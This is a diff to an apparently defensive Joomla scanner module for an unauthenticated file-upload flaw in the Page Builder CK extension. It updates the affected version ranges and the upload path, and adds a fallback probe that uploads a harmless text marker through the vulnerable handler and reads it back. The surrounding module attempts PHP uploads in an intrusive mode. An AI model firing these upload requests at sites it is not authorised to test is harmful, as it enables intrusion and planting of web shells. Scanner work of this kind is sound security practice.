@@ -18,14 +18,15 @@ HAS_EXPLOIT = True
 INTRUSIVE = True
 EXPLOIT_MODES = ["aggressive"]
 AFFECTED_JOOMLA_VERSIONS = ["*"]
-AFFECTED_RULE = "Page Builder CK vulnerable upload handlers; legacy 1.x/2.x and reported 3.x ranges"
+AFFECTED_RULE = "Page Builder CK up to and including 3.5.10 (fixed 3.6.0; J3 line fixed 3.1.1; J4 line fixed 3.4.10)"
+FIXED_RULE = "Page Builder CK 3.6.0 or later (3.1.1+ on Joomla 3, 3.4.10+ on Joomla 4)"
 TASK_CANDIDATES = [
     "browse.ajaxAddPicture",
 ]
 FILE_PARAM_NAMES = ["file"]
 FOLDER_PARAM_NAMES = ["path"]
 DEST_PATHS = [
-    "images/pagebuilderck/",
+    "media/com_pagebuilderck/gfonts/",
 ]
 SHELL_EXTENSIONS = ["php", "PHP", "pht", "phar"]
 
@@ -49,6 +50,25 @@ def extract_csrf(target_url: str, timeout: int = 12, proxy: str | None = None):
     return None
 
 
+def affected_pagebuilderck(version: str | None) -> bool | None:
+    """True if in the affected current line, False if fixed, None if ambiguous."""
+    from ...core.versions import parse_version_safe, version_lte
+
+    parsed = parse_version_safe(version)
+    if parsed is None:
+        return None
+    release = parsed.release
+    if release[0] == 3 and len(release) > 1 and release[1] in (1, 4):
+        # Legacy Joomla 3 / Joomla 4 lines carry their own back-ports
+        # (fixed 3.1.1 / 3.4.10); the current-line range does not apply.
+        return None
+    if version_lte(version, "3.5.10"):
+        return True
+    if not version_lte(version, "3.6.0"):
+        return False
+    return None
+
+
 def passive_result(plugins: dict | None) -> Finding:
     pbck = (plugins or {}).get("pagebuilderck", {})
     found = bool(pbck.get("found"))
@@ -66,6 +86,33 @@ def passive_result(plugins: dict | None) -> Finding:
             exploit_available=HAS_EXPLOIT,
             detail="Page Builder CK was not detected via components/component/media routes.",
             action="Component not detected via standard public routes; verify manually if installed elsewhere.",
+        )
+    verdict = affected_pagebuilderck(version)
+    if verdict is True:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="LIKELY_VULNERABLE",
+            confidence="HIGH",
+            component=COMPONENT,
+            component_version=version,
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            detail=f"Page Builder CK {version} is at or below 3.5.10.",
+            action=f"Upgrade Page Builder CK to {FIXED_RULE} and inspect media/com_pagebuilderck/ for stray PHP files.",
+        )
+    if verdict is False:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="PATCHED",
+            confidence="HIGH",
+            component=COMPONENT,
+            component_version=version,
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            detail=f"Page Builder CK {version} is at or above the fixed 3.6.0.",
+            action="No action required if the installed package is vendor-original.",
         )
     return Finding(
         cve=CVE_ID,
@@ -134,7 +181,7 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
             "browse.ajaxAddPicture",
             "file",
             "path",
-            "images/pagebuilderck/",
+            "media/com_pagebuilderck/gfonts/",
             csrf_name,
             timeout,
             proxy,
@@ -165,13 +212,13 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                     exploit_available=HAS_EXPLOIT,
                     exploit_ran=True,
                     proof_url=proof_url,
-                    uploaded_filename=f"images/pagebuilderck/{filename}",
+                    uploaded_filename=f"media/com_pagebuilderck/gfonts/{filename}",
                     detail=(
                         "Targeted lab probe used Page Builder CK's real upload flow "
                         "(task=browse.ajaxAddPicture, file field=file, path field=path) "
                         f"and executed dynamic PHP math proof ({expected_product})."
                     ),
-                    action=f"Delete images/pagebuilderck/{filename}, inspect for compromise, and update Page Builder CK.",
+                    action=f"Delete media/com_pagebuilderck/gfonts/{filename}, inspect for compromise, and update Page Builder CK.",
                 )
             if is_source or "<?php" in proof_body.lower():
                 return Finding(
@@ -184,13 +231,60 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                     exploit_available=HAS_EXPLOIT,
                     exploit_ran=True,
                     proof_url=proof_url,
-                    uploaded_filename=f"images/pagebuilderck/{filename}",
+                    uploaded_filename=f"media/com_pagebuilderck/gfonts/{filename}",
                     detail=(
                         "Targeted lab probe confirmed a file write through the real Page Builder CK "
                         "upload flow, but PHP execution was not confirmed because the server returned source."
                     ),
-                    action=f"Delete images/pagebuilderck/{filename} and update Page Builder CK.",
+                    action=f"Delete media/com_pagebuilderck/gfonts/{filename} and update Page Builder CK.",
                 )
+    # Fallback: benign marker upload. Modern Joomla stacks gate unsafe files
+    # in the framework input layer (isSafeFile), so a literal .php may never
+    # reach the component; a benign marker still proves the missing
+    # auth/permission gate when stored publicly.
+    marker = f"PROOFCMS_PBCK_{rand_str(12)}"
+    txt_name = f"jvh-pbck-{rand_str(8)}.txt"
+    txt_content = f"ProofCMS authorized audit marker {marker}\n"
+    txt_type, txt_body = build_multipart(
+        {"path": "media/com_pagebuilderck/gfonts/"},
+        {"file": (txt_name, txt_content, "text/plain")},
+    )
+    txt_upload_url = (
+        f"{base}/index.php?option=com_pagebuilderck"
+        f"&task=browse.ajaxAddPicture"
+        f"&{csrf_name}=1"
+    )
+    txt_upload = request(
+        txt_upload_url,
+        method="POST",
+        headers={"Content-Type": txt_type},
+        data=txt_body,
+        timeout=timeout,
+        proxy=proxy,
+    )
+    txt_upload_status = txt_upload.get("status", 0)
+    txt_proof_url = urljoin(base + "/", f"/media/com_pagebuilderck/gfonts/{txt_name}")
+    txt_proof = request(txt_proof_url, timeout=timeout, proxy=proxy)
+    if txt_proof.get("status") == 200 and marker in (txt_proof.get("body", "") or ""):
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="VULNERABLE_UPLOAD_ONLY",
+            confidence="CONFIRMED",
+            component=COMPONENT,
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            proof_url=txt_proof_url,
+            uploaded_filename=f"media/com_pagebuilderck/gfonts/{txt_name}",
+            detail=(
+                "Unauthenticated marker upload was accepted and read back byte-identical from the public "
+                "gfonts directory, confirming the missing auth/permission gate. A literal .php does not "
+                "reach the component on this stack (framework isSafeFile input gate); execution is "
+                "server-dependent and no executable content was uploaded."
+            ),
+            action=f"Delete media/com_pagebuilderck/gfonts/{txt_name} and update Page Builder CK.",
+        )
     return Finding(
         cve=CVE_ID,
         name=NAME,
@@ -205,6 +299,7 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
             "(task=browse.ajaxAddPicture, file field=file, path field=path), but did not confirm "
             "PHP write/execution. Observed: "
             + ("; ".join(observed[:8]) if observed else "none")
+            + f"; marker upload {txt_upload_status}, proof {txt_proof.get('status')}."
         ),
         action="If any lab probe wrote a file, remove it and update Page Builder CK.",
     )
@@ -248,11 +343,14 @@ def metadata() -> dict:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.2.0",
-        "last_reviewed": "2026-03-20",
-        "updated": "2026-03-20",
+        "module_version": "1.3.0",
+        "last_reviewed": "2026-11-11",
+        "updated": "2026-11-11",
         "required_detectors": ["pagebuilderck"],
         "references": [
             "https://www.joomlack.fr/en/joomla-extensions/page-builder-ck",
+            "https://www.cve.org/CVERecord?id=CVE-2026-56290",
+            "https://www.exploit-db.com/exploits/52626",
+            "https://mysites.guru/blog/pagebuilderck-unauthenticated-file-upload-rce/",
         ],
     }
